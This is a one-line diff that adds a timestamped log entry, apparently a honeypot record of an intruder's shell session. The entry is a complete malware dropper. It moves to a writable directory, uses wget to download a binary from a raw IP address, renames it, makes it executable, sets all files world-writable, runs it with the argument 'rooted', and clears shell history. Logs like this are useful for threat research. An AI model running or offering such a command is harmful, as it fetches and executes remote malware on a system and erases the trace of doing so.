@@ -1,0 +1,1 @@
+2021-05-01 22:20:17.870543+00:00 -|::|- cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://179.43.176.41/cometome; cat cometome > meth; chmod +x meth; chmod 777 *; ./meth rooted; history -c
